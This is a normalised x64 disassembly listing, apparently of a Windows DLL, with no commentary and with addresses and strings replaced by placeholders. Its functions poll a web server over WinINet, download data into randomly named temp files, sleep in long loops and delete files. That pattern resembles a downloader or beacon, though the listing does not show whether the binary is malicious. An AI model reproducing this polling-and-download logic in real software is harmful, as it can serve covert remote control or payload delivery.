mov rbp [ rsp + 0x90 ]
mov [ rsp + 0x30 ] rsi
lea rdx [ r--data ]
mov rcx rbp
mov r9 r13
mov r8 r14
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] rdi
call [ wsprintfA@IAT ]
mov rcx rdi
call j_sub_180002148
mov rcx rsi
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rcx r13
call j_sub_180002148
mov rcx r14
call j_sub_180002148
mov rcx r15
call j_sub_180002148
mov rbx [ rsp + 0x88 ]
test rbx rbx
je r-xdata
sub_180007a30
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov rdi rcx
mov rcx [ rcx + 0x8 ]
mov rsi rdx
lea rdx [ r--data ]
mov r8d 0x4
call sub_1800015ec
mov r8 [ rw-data ]
mov rbx [ r8 ]
mov r12 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r15d 0x1
mov [ rsp + 0x28 ] eax
lea r14 [ r--data ]
lea rdx [ r--data ]
lea r8d [ r15 + 0x2b ]
mov r9d r15d
mov [ rsp + 0x20 ] r14
call [ rbx ]
mov rcx [ rdi + 0x8 ]
lea ebp [ r15 + 0x2e ]
lea rdx [ r--data ]
mov r8d ebp
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r15 + 0x2c ]
lea rdx [ r--data ]
mov r9d r15d
mov [ rsp + 0x20 ] r14
call [ rbx ]
mov rcx rdi
call sub_1800076a4
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r14 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d ebp
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rdi + 0x10 ]
xor ebp ebp
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] ebp
call [ InternetOpenA@IAT ]
mov rdx [ rdi + 0x18 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] ebp
lea r8d [ rbp + 0x50 ]
mov rcx rax
xor r9d r9d
mov [ rsp + 0x28 ] 0x3
mov r15 rax
mov [ rsp + 0x20 ] rbp
call [ InternetConnectA@IAT ]
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
mov [ rsp + 0x90 ] rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
lea r9d [ rbp + 0x1 ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ rbp + 0x30 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] ebp
xor r9d r9d
mov r8 r14
mov rdx r12
mov rcx rdi
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x20 ] rbp
call [ HttpOpenRequestA@IAT ]
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rbp rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x30 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rsi
call [ lstrlenA@IAT ]
mov r9 rsi
or r8d 0xffffffff
mov rdx r13
mov rcx rbp
mov [ rsp + 0x20 ] eax
call [ HttpSendRequestA@IAT ]
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov esi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x32 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
test esi esi
je r-xdata
mov rcx rbp
call [ InternetCloseHandle@IAT ]
mov rcx rdi
call [ InternetCloseHandle@IAT ]
mov rcx r15
call [ InternetCloseHandle@IAT ]
mov rcx r14
call j_sub_180002148
mov rcx r13
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rbx [ rsp + 0x88 ]
mov eax esi
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
and [ rsp + 0x80 ] 0x0
and [ rsp + 0x20 ] 0x0
xor r8d r8d
lea edx [ r8 + 0x16 ]
lea r9 [ rsp + 0x80 ]
mov rcx rbp
call [ HttpQueryInfoA@IAT ]
mov esi eax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x33 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov ecx [ rsp + 0x80 ]
call j_sub_180002178
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x80 ]
mov r8 rax
mov edx 0x13
mov rcx rbp
mov rdi rax
call [ HttpQueryInfoA@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov esi 0x1
lea rax [ r--data ]
lea r8d [ rsi + 0x34 ]
lea rdx [ r--data ]
mov r9d esi
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea ebx [ rsi + 0x2 ]
lea rdx [ r--data ]
mov r8d ebx
mov rcx rdi
call sub_180001768
test eax eax
je r-xdata
mov rcx rdi
call j_sub_180002148
mov rdi [ rsp + 0x90 ]
lea rdx [ r--data ]
mov r8d ebx
mov rcx rdi
call sub_180001768
test eax eax
je r-xdata
xor esi esi
sub_180007de4
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
xor esi esi
mov rbp r8
mov rdi rdx
mov r12d esi
mov r13 rcx
call sub_1800076a4
mov rcx [ r13 + 0x8 ]
lea r8d [ rsi + 0x4 ]
lea rdx [ r--data ]
mov r14 rax
call sub_1800015ec
mov rcx [ r13 + 0x8 ]
lea r8d [ rsi + 0x2f ]
lea rdx [ r--data ]
mov r15 rax
call sub_1800015ec
mov [ rsp + 0x48 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ rsi + 0x1 ]
lea r8d [ rsi + 0x37 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ r13 + 0x10 ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] esi
call [ InternetOpenA@IAT ]
mov rdx [ r13 + 0x18 ]
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] esi
lea r8d [ rsi + 0x50 ]
mov rcx rax
xor r9d r9d
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x20 ] rsi
call [ InternetConnectA@IAT ]
mov rsi rax
mov [ rsp + 0x50 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r12 + 0x1 ]
lea r8d [ r12 + 0x38 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
xor eax eax
xor r9d r9d
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] eax
mov [ rsp + 0x28 ] rax
mov r8 r14
mov rdx r15
mov rcx rsi
mov [ rsp + 0x20 ] rax
call [ HttpOpenRequestA@IAT ]
mov rsi rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r12 + 0x1 ]
lea r8d [ r12 + 0x39 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rdi
call [ lstrlenA@IAT ]
mov rdx [ rsp + 0x48 ]
mov r9 rdi
or r8d 0xffffffff
mov rcx rsi
mov [ rsp + 0x20 ] eax
call [ HttpSendRequestA@IAT ]
mov edi eax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r12 + 0x1 ]
lea r8d [ r12 + 0x3a ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
test edi edi
je r-xdata
mov rcx rsi
call [ InternetCloseHandle@IAT ]
mov rcx [ rsp + 0x50 ]
call [ InternetCloseHandle@IAT ]
mov rcx [ rsp + 0x58 ]
call [ InternetCloseHandle@IAT ]
mov rcx [ rsp + 0x48 ]
call j_sub_180002148
mov rcx r15
call j_sub_180002148
mov rcx r14
call j_sub_180002148
mov rbx [ rsp + 0xa8 ]
mov rax r12
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
and [ rsp + 0xa0 ] r12d
and [ rsp + 0x20 ] r12
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0xa0 ]
mov edx 0x20000005
mov rcx rsi
mov [ rsp + 0x40 ] 0x4
call [ HttpQueryInfoA@IAT ]
mov edi eax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ r12 + 0x1 ]
lea r8d [ r12 + 0x3b ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
test edi edi
je r-xdata
mov eax [ rsp + 0xa0 ]
test eax eax
je r-xdata
and [ rbp ] 0x0
mov ecx eax
call j_sub_180002178
mov r8d [ rsp + 0xa0 ]
xor ebx ebx
and [ rsp + 0xb8 ] ebx
mov rdi rax
cmp ebx r8d
jne r-xdata
cmp ebx r8d
jb r-xdata
mov rcx rdi
call j_sub_180002148
mov eax [ rsp + 0xa0 ]
test eax eax
jne r-xdata
mov rcx [ r13 + 0x8 ]
mov r9 rbp
mov rdx rdi
call sub_180001448
mov r12 rax
mov edx ebx
lea r9 [ rsp + 0xb8 ]
mov rcx rsi
add rdx rdi
call [ InternetReadFile@IAT ]
mov r11d [ rsp + 0xb8 ]
mov r8d [ rsp + 0xa0 ]
add ebx r11d
test r11d r11d
je r-xdata
sub_180008118
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x78
xor edi edi
mov r13 r8
mov r15 rcx
mov [ r8 ] edi
call sub_1800076a4
mov rcx [ r15 + 0x8 ]
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
mov rbp rax
call sub_1800015ec
mov rcx [ r15 + 0x8 ]
lea r8d [ rdi + 0x2f ]
lea rdx [ r--data ]
mov r12 rax
call sub_1800015ec
mov ebx 0x104
mov ecx ebx
mov [ rsp + 0xd8 ] rax
call sub_1800042d8
mov ecx ebx
mov rdx rax
mov r14 rax
call [ GetTempPathA@IAT ]
lea ecx [ rdi + 0x14 ]
call j_sub_1800042d8
mov rbx rax
test rax rax
je r-xdata
mov rbx rdi
mov [ rax + 0x8 ] rdi
mov [ rax + 0x10 ] edi
lea rax [ r--data ]
mov [ rbx ] rax
jmp r-xdata
mov r8b 0x7a
mov dl 0x61
mov ecx 0x5
call sub_18000661c
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call sub_18000574c
mov rcx rbx
mov rsi rax
call sub_1800042fc
mov [ rsp + 0xd0 ] edi
jmp r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
lea rdx [ r--data ]
mov r9 rbx
mov r8d 0xa7
mov rcx r14
mov [ rsp + 0x20 ] 0x1
call sub_180006a40
mov rcx rbx
call sub_18000666c
test rbx rbx
je r-xdata
lea rcx [ rsp + 0xd0 ]
call sub_180006970
mov ecx eax
test eax eax
je r-xdata
mov ecx 0x7530
call [ Sleep@IAT ]
mov rax [ rsp + 0xc8 ]
mov rdx [ r15 + 0x10 ]
mov [ rsp + 0x68 ] 0x1
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0xd8 ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x48 ] rax
mov rax [ r15 + 0x18 ]
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] rax
call sub_180004efc
mov rcx [ rsp + 0xd8 ]
mov bl al
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
lea r8 [ r--data ]
mov rdx rsi
mov rcx r14
call sub_18000574c
lea r9 [ r--data ]
lea rdx [ r--data ]
mov r8 rsi
mov rcx r14
mov rbp rax
call sub_18000574c
mov rcx rsi
mov r12 rax
call sub_1800042fc
mov rsi rdi
mov [ rsp + 0xc0 ] edi
test bl bl
je r-xdata
mov rcx rbp
call sub_1800042fc
mov rcx r12
call sub_1800042fc
mov rcx r14
call sub_1800042fc
test rsi rsi
je r-xdata
mov ebx edi
mov rax rdi
add rsp 0x78
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
cmp [ rsp + 0xc0 ] 0x1
jne r-xdata
lea rdx [ rsp + 0xc0 ]
mov rcx r12
call sub_1800063cc
mov rcx r12
mov rcx rbp
call sub_1800062bc
test al al
jne r-xdata
test rsi rsi
je r-xdata
cmp [ rsi ] 0x32
jne r-xdata
lea rdx [ rsp + 0xc0 ]
mov rcx rbp
call sub_1800063cc
mov rcx rbp
jmp r-xdata
mov ecx 0x2710
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x1e
jb r-xdata
mov r8d [ rsp + 0xc0 ]
mov rcx [ r15 + 0x8 ]
mov r9 r13
mov rdx rsi
call sub_180001448
mov rdi rax
mov rcx rsi
mov [ r13 ] edi
call sub_1800042fc
mov rsi rdi
mov rsi rax
call [ DeleteFileA@IAT ]
mov rcx r12
call sub_1800062bc
test al al
jne r-xdata
jmp r-xdata
sub_1800083cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rdi rcx
mov [ rcx + 0x44 ] 0x0
call sub_180006f8c
xor bl bl
lea rsi [ r--data ]
mov [ rdi + 0x44 ] 0x0
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
mov r9d 0x1
mov r8d 0x159
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov rcx rdi
call sub_180007000
mov ecx 0x3a98
call [ Sleep@IAT ]
inc bl
cmp bl 0x2
jb r-xdata
mov rdx rsi
mov rcx rdi
call sub_180007a30
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180008468
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov rsi rcx
call sub_1800076a4
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d 0x4
mov rbp rax
call sub_1800015ec
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d 0x2f
mov r12 rax
call sub_1800015ec
mov ebx 0x104
mov ecx ebx
mov r15 rax
call sub_1800042d8
mov ecx ebx
mov rdx rax
mov r13 rax
call [ GetTempPathA@IAT ]
mov ecx 0x14
call j_sub_1800042d8
xor edi edi
mov rbx rax
test rax rax
je r-xdata
mov rbx rdi
mov [ rax + 0x8 ] rdi
mov [ rax + 0x10 ] edi
lea rax [ r--data ]
mov [ rbx ] rax
jmp r-xdata
mov r8b 0x7a
mov dl 0x61
mov ecx 0x5
call sub_18000661c
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rax
mov rbx rax
call sub_18000574c
mov rcx rbx
mov r14 rax
call sub_1800042fc
mov [ rsp + 0xc0 ] edi
jmp r-xdata
mov rax [ rbx ]
mov edx r14d
mov rcx rbx
call [ rax ]
lea rdx [ r--data ]
mov r14d 0x1
mov r9 rbx
mov r8d 0xa7
mov rcx r13
mov [ rsp + 0x20 ] r14b
call sub_180006a40
mov rcx rbx
call sub_18000666c
test rbx rbx
je r-xdata
lea rcx [ rsp + 0xc0 ]
call sub_180006970
mov ecx eax
test eax eax
je r-xdata
mov ecx 0x7530
call [ Sleep@IAT ]
mov rax [ rsp + 0xb8 ]
mov rdx [ rsi + 0x10 ]
mov [ rsp + 0x68 ] 0x1
mov [ rsp + 0x60 ] r14
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x50 ] rax
mov rax [ rsi + 0x18 ]
mov [ rsp + 0x48 ] r15
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] rdi
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] rax
call sub_180005324
mov rcx r15
mov bl al
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
lea r8 [ r--data ]
mov rdx r14
mov rcx r13
call sub_18000574c
lea r9 [ r--data ]
lea rdx [ r--data ]
mov r8 r14
mov rcx r13
mov rbp rax
call sub_18000574c
mov rcx r14
mov r12 rax
call sub_1800042fc
mov rsi rdi
mov [ rsp + 0xb0 ] edi
test bl bl
je r-xdata
mov rcx rbp
call sub_1800042fc
mov rcx r12
call sub_1800042fc
mov rcx r13
call sub_1800042fc
test rsi rsi
je r-xdata
mov ebx edi
mov rcx rsi
call sub_1800042fc
mov rbx [ rsp + 0xc8 ]
movzx eax dil
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov ecx 0x1
cmp [ rsp + 0xb0 ] ecx
jne r-xdata
lea rdx [ rsp + 0xb0 ]
mov rcx r12
call sub_1800063cc
mov rcx r12
mov rcx rbp
call sub_1800062bc
test al al
jne r-xdata
cmp [ rsi ] 0x32
movzx edi dil
cmove edi ecx
lea rdx [ rsp + 0xb0 ]
mov rcx rbp
call sub_1800063cc
mov rcx rbp
jmp r-xdata
mov ecx 0x2710
call [ Sleep@IAT ]
inc ebx
cmp ebx 0x1e
jb r-xdata
mov rsi rax
call [ DeleteFileA@IAT ]
mov rcx r12
call sub_1800062bc
test al al
jne r-xdata
jmp r-xdata
sub_180008700
push rbx
sub rsp 0x30
cmp [ rcx + 0x44 ] 0x0
je r-xdata
call sub_180007a30
test eax eax
je r-xdata
call sub_180008468
test eax eax
je r-xdata
xor eax eax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov r8d 0x1bb
jmp r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov r8d 0x2b
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d 0x1
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_180008784
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x48
mov rsi rcx
call sub_180006eec
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r15d 0x1
mov [ rsp + 0x28 ] eax
lea rbp [ r--data ]
lea r13 [ r--data ]
lea r8d [ r15 + 0x13 ]
mov r9d r15d
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx rsi
call sub_1800083cc
mov edi 0x1b7740
jmp r-xdata
test eax eax
mov rax [ rw-data ]
mov rbx [ rax ]
je r-xdata
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d r15d
mov [ rsp + 0x28 ] eax
mov r8d 0x15
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov ecx edi
call [ Sleep@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x16
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx rsi
call sub_1800083cc
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d r15d
mov [ rsp + 0x28 ] eax
mov r8d 0x17
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx rsi
call sub_18000744c
mov rbx rax
mov rdx rax
jmp r-xdata
mov rcx rsi
call sub_180008700
test eax eax
je r-xdata
mov ecx edi
call [ Sleep@IAT ]
mov rdx rbx
mov rcx rbx
call j_sub_180002148
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d r15d
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r14 rax
mov [ rsp + 0x38 ] rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d r15d
mov [ rsp + 0x28 ] eax
mov r8d 0x18
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d r15d
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x19
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov r8 rdi
mov rdx r14
mov rcx rsi
call sub_180007268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x1a
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
or [ rsp + 0x90 ] 0xffffffff
cmp [ rsi + 0x44 ] 0x0
lea r8 [ rsp + 0x90 ]
mov rdx rdi
mov rcx rsi
je r-xdata
mov ecx edi
call [ Sleep@IAT ]
jmp r-xdata
call sub_180007de4
call sub_180008118
jmp r-xdata
mov rcx rsi
call sub_1800083cc
test eax eax
jne r-xdata
mov rcx r14
call j_sub_180002148
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x27
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov edi 0x1b7740
jmp r-xdata
mov ecx 0x20
call sub_180002178
test rax rax
je r-xdata
mov r12 rax
mov [ rsp + 0xa0 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x1b
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx rdi
call j_sub_180002148
test r12 r12
je r-xdata
xor edi edi
mov r8d [ rsp + 0x90 ]
mov rdx r12
mov rcx rax
call sub_180009da0
mov rdi rax
jmp r-xdata
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d r15d
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
mov r9d r15d
mov r8d 0x24
mov rdx rbp
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov r8 r13
mov rdx r14
mov rcx rsi
call sub_180007268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rbp rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x25
mov [ rsp + 0x20 ] rax
call [ rbx ]
cmp [ rsi + 0x44 ] 0x0
mov rdx rbp
mov rcx rsi
je r-xdata
lea r12 [ r--data ]
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x1c
mov rdx rbp
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov rcx rdi
call sub_180009ab0
test al al
je r-xdata
call sub_180007a30
call sub_180008468
jmp r-xdata
call sub_180007de4
call sub_180008118
jmp r-xdata
mov rcx r12
call j_sub_180002148
lea rbp [ r--data ]
lea r13 [ r--data ]
mov rcx rdi
call sub_180009e14
mov rcx rdi
call sub_180002148
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x26
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rbp
call j_sub_180002148
mov rcx r13
call j_sub_180002148
test rdi rdi
je r-xdata
mov rcx r14
call j_sub_180002148
mov rcx r13
call j_sub_180002148
mov rcx rdi
call sub_180009ab0
lea rbp [ r--data ]
test al al
jne r-xdata
mov r8d [ rsp + 0x98 ]
mov rdx rbp
mov rcx rdi
call sub_180009e4c
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r15 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x1f ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
test r15 r15
je r-xdata
mov rbp rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x1f
mov [ rsp + 0x20 ] r12
call [ rbx ]
test rbp rbp
je r-xdata
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d r15d
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
mov [ rsp + 0x30 ] rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d r15d
mov [ rsp + 0x28 ] eax
mov r8d 0x1d
mov rdx rbp
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rcx rdi
call sub_180009d94
mov rdx r13
mov rcx rsi
mov r8 rax
call sub_180007268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r14 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov r8d 0x1e
mov rdx rbp
mov [ rsp + 0x20 ] r12
call [ rbx ]
or [ rsp + 0x98 ] 0xffffffff
cmp [ rsi + 0x44 ] 0x0
lea r8 [ rsp + 0x98 ]
mov rdx r14
mov rcx rsi
je r-xdata
mov r12 [ rsp + 0xa0 ]
mov r14 [ rsp + 0x38 ]
lea rbp [ r--data ]
mov rcx rbp
call j_sub_180002148
mov r15d 0x1
mov rcx [ rsi + 0x8 ]
lea rdx [ r--data ]
mov r8d 0x1
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
mov [ rsp + 0xa8 ] rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r8d [ r9 + 0x20 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov r8 r15
mov rdx r13
mov rcx rsi
call sub_180007268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x21 ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
cmp [ rsi + 0x44 ] 0x0
mov rdx r13
mov rcx rsi
je r-xdata
call sub_180007a30
call sub_180008468
jmp r-xdata
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x22 ]
mov [ rsp + 0x20 ] r12
call [ rbx ]
mov rcx r13
call j_sub_180002148
mov rcx [ rsp + 0xa8 ]
call j_sub_180002148
mov rcx r15
call j_sub_180002148
mov r13 [ rsp + 0x30 ]
sub_180008eb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rdx
mov rcx r8
mov edx 0x8
mov rbx r8
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ rbx ] 0x0
mov esi 0x10
lea rdx [ r--data ]
mov r8d esi
mov rcx rdi
call sub_180001768
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
lea rax [ rw-data ]
mov [ rbx ] rax
xor eax eax
lea rdx [ r--data ]
mov r8d esi
mov rcx rdi
call sub_180001768
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ r--data ]
mov r8d esi
mov rcx rdi
call sub_180001768
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
sub_180008f5c
